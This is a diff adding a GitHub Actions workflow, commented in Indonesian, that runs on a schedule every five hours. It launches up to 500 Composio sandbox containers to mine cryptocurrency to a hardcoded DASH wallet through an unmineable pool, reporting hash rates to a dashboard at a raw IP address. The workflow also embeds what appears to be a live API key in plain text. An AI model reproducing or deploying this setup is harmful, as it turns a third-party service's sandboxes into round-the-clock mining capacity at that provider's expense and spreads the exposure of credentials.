@@ -1,0 +1,65 @@
+name: Composio 500x xLarge 24/7 Cloud Miner (1 Single Job)
+
+on:
+  push:
+    branches:
+      - main
+      - master
+  schedule:
+    # Otomatis rerun setiap 5 jam nonstop 24/7
+    - cron: '0 */5 * * *'
+  workflow_dispatch:
+    inputs:
+      dashboard_url:
+        description: 'URL / IP Web Dashboard'
+        required: false
+        default: 'http://139.162.42.49:3000'
+      total_containers:
+        description: 'Total Container Sandbox (Default: 500)'
+        required: false
+        default: '500'
+
+jobs:
+  composio-mining:
+    name: Composio 500x xLarge Cluster (4,000 vCPU / 4 TB RAM)
+    runs-on: ubuntu-latest
+    timeout-minutes: 360  # 6 jam limit GitHub Actions
+
+    env:
+      # ===================================================================
+      # 🔑 COMPOSIO API KEY(s) — Bisa isi 1 atau banyak (pisah baris)
+      # ===================================================================
+      COMPOSIO_API_KEYS: |
+        ak_z6I3qnlD-mQDNAyYyJWC
+
+      # ===================================================================
+      # ⚙️ Pengaturan Worker & Compute (1 Single Job: 500 Containers)
+      # ===================================================================
+      SLOTS_PER_KEY:    "${{ github.event.inputs.total_containers || '500' }}"
+      SANDBOX_SIZE:     "xlarge"              # 8 vCPU & 8 GB RAM per container
+      MINING_THREADS:   "8"                   # 8 threads per container
+      WALLET_USER:      "DASH:XcufdyxZtL4JUjALZfTq6pCrxyTt2Hy2Zu.sal909"
+      POOL_URL:         "rx.unmineable.com:443"
+      MAX_HOURS:        "5.75"                # Durasi sebelum auto-restart di GitHub
+
+      # ===================================================================
+      # 📡 URL / IP Dashboard untuk Live Reporting (KH/s masuk ke Dashboard)
+      # ===================================================================
+      DASHBOARD_URL:    "${{ github.event.inputs.dashboard_url || 'http://139.162.42.49:3000' }}"
+
+    steps:
+      - name: Checkout Repository
+        uses: actions/checkout@v4
+
+      - name: Setup Node.js 20
+        uses: actions/setup-node@v4
+        with:
+          node-version: 20
+
+      - name: Install Composio SDK
+        run: |
+          npm install @composio/core
+
+      - name: Run Composio 500x xLarge Cluster Runner
+        run: |
+          node composio_runner.js
